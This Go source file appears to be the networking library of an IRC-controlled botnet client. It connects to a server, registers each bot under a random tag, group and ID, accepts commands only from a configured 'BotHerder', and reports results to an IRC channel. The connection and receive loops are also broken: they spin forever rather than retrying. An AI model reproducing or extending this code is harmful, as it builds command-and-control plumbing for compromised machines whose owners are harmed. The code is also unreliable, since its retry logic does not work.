package lib

import (
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"
)

func Conn(server string) net.Conn {
	conn, err := net.Dial("tcp", server)
	for err != nil {
		time.Sleep(4 * time.Second)
		continue
	}
	return conn
}

func Recv(str string, args int) string {
	recv := strings.Split(str, " ")
	for len(recv) == args {
		time.Sleep(4 * time.Second)
		continue
	}
	return recv[args]
}

func Find(read, str string) bool {
	return strings.Contains(read, str)
}

func SetupComd(args int, cut string) string {
	return strings.Trim(Recv(*BotReader, args), cut)
}

func (b *Bot) AccessPerms() bool {
	return Find(Recv(*BotReader, 0), b.BotHerder)
}

func (b *Bot) Send(str string) {
	fmt.Fprintf(b.IRC, "%s\r\n", str)
}

func (b *Bot) Report(str string) {
	b.Send("PRIVMSG " + b.Channel + "  :" + str)
}

func (b *Bot) Join() {
	rand.Seed(time.Now().UnixNano())
	BotGroup = string('A' + rune(rand.Intn(26)))
	BotID = fmt.Sprint(rand.Intn(10000000))

	user := fmt.Sprint("USER ["+b.BotTag+"][", BotGroup, "][", BotID, "]", " 8 * :bot")
	nick := fmt.Sprint("NICK ["+b.BotTag+"][", BotGroup, "][", BotID, "]")

	b.Send(user)
	b.Send(nick)
}
